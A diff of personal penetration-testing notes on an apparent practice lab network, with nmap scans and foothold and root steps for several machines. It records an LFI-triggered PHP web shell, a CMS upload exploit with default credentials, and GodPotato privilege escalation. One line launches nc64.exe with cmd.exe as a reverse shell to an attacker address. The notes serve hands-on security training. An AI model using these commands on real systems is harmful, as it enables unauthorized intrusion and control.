@@ -1,5 +1,5 @@
 # VM 2 .189
--?
+- MAIL
 ```
 PORT      STATE SERVICE       VERSION
 25/tcp    open  smtp          hMailServer smtpd
@@ -41,7 +41,7 @@ Host script results:
 ```
 
 # VM 3 .191
-- ?
+- LOGIN
 ```
 PORT      STATE SERVICE       VERSION
 25/tcp    open  smtp          hMailServer smtpd
@@ -170,7 +170,7 @@ Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel
     ```
 
 
-# VM 11 .246
+# VM 11 .246 (pwned)
 - DEMO.DMZ.RELIA.COM
 ```
 PORT    STATE SERVICE  VERSION
@@ -187,10 +187,88 @@ PORT    STATE SERVICE  VERSION
 | Not valid before: 2022-10-12T07:46:27
 |_Not valid after:  2032-10-09T07:46:27
 |_http-server-header: Apache/2.4.52 (Ubuntu)
+2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
+|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Foothold
+- reusing .245 config
+```
+    sudo ssh anita@192.168.245.246 -p 2222 -i anita.key 
+    fireball
+```
+
+## Root
+1. Found internal web app in 8000 port
+2. Found LFI in  ``` http://240.0.0.1:8000/backend/?view=../../../../../../../../var/crash/shell.php```
+3. Reverse shell get ``` www-data ``` but it is ``` sudo -l : ALL=(ALL) NOPASSWD```
+
+## Interesting Info
+```
+═╣ PHP exec extensions
+drwxr-xr-x 2 root root 4096 Oct 12  2022 /etc/apache2/sites-enabled                                                                       
+drwxr-xr-x 2 root root 4096 Oct 12  2022 /etc/apache2/sites-enabled
+lrwxrwxrwx 1 root root 35 Oct 12  2022 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Oct 12  2022 /etc/apache2/sites-enabled/default-ssl.conf -> ../sites-available/default-ssl.conf
+<IfModule mod_ssl.c>
+        <VirtualHost _default_:443>
+                ServerAdmin webmaster@localhost
+                DocumentRoot /var/www/html
+                ErrorLog ${APACHE_LOG_DIR}/error.log
+                CustomLog ${APACHE_LOG_DIR}/access.log combined
+                SSLEngine on
+                SSLCertificateFile      /etc/ssl/certs/ssl-cert-snakeoil.pem
+                SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
+                <FilesMatch "\.(cgi|shtml|phtml|php)$">
+                                SSLOptions +StdEnvVars
+                </FilesMatch>
+                <Directory /usr/lib/cgi-bin>
+                                SSLOptions +StdEnvVars
+                </Directory>
+        </VirtualHost>
+</IfModule>
+lrwxrwxrwx 1 root root 36 Oct 12  2022 /etc/apache2/sites-enabled/internal-app.conf -> ../sites-available/internal-app.conf
+<VirtualHost 127.0.0.1:8000>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/internal
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+
+-rw-r--r-- 1 root root 1332 Oct 12  2022 /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Oct 12  2022 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 72928 Aug  8  2022 /etc/php/8.1/apache2/php.ini
+
+
+
+```
+
+
 # VM 12 .247 (pwned)
-- WEB02 (Standalone machine | No Internal Access)
+- WEB02 
 ```
 PORT    STATE SERVICE  VERSION
 80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
@@ -275,7 +353,7 @@ Host script results:
     .\GodPotato-NET4.exe -cmd "C:\temp\nc64.exe 192.168.45.200 8000 -e cmd.exe" 
 ```
 
-# VM 13 .248
+# VM 13 .248 (pwned)
 - External.dmz
 ```
 PORT      STATE SERVICE       VERSION
@@ -378,7 +456,7 @@ Host script results:
 ```
 
 
-# VM 14 .249
+# VM 14 .249 (pwned)
 - LEGACY
 ```
 PORT      STATE SERVICE       VERSION
@@ -422,4 +500,17 @@ Host script results:
 | smb2-time: 
 |   date: 2024-08-06T13:56:45
 |_  start_date: N/A
+```
+
+## Foothold
+1. found running 8000 web service vulnerable in http://192.168.245.249:8000/cms/admin.php?(https://www.exploit-db.com/exploits/50616) [password = admin:admin]
+2. uploaded shell.php 
+3. run ``` 192.168.245.249:8000/cms/media/shell.pHp ```
+
+## Root
+1. GodPotato 4
+
+
+## Interesting info
+```
 ```
